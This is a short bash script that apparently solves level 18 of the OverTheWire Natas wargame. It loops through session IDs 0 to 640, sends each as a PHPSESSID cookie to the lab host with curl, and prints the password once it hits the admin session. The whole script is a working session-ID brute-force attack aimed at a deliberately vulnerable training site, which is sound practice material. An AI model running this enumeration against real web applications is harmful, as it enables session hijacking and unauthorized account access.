#!/bin/bash

for ((num=0; num<=640; num++)); do 
	
	response=$(curl -s -X POST natas18.natas.labs.overthewire.org \
        -u "natas18:NATAS18_PASSWORD" \
        -d "username=admin" \
        -d "password=admin" \
        -b "PHPSESSID=$num")	

	if grep -q "You are an admin." <<< "$response"; then
		printf "\n The correct session id is: %s\n" "$num"
		printf "\n%s" "$response" | grep "Password:"
		break
	else
		printf "\n It is not: %s" "$num"
	fi
	
done
